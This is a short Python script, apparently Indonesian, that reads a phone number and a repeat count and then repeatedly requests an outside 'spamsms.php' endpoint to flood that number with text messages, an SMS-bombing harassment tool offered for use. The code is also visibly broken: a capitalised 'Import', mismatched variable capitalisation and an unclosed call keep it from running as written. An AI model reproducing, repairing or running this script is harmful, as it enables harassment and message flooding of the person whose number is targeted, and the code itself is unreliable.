Import requests

Nomer = input("nomer :  ")
Jumlah = int(input("jumlah spam :  "))
for i in range(jumlah) :
    Url = requests.get(f"https://darkteam.my.id/minispam/spamsms.php?nomer={nomer}"
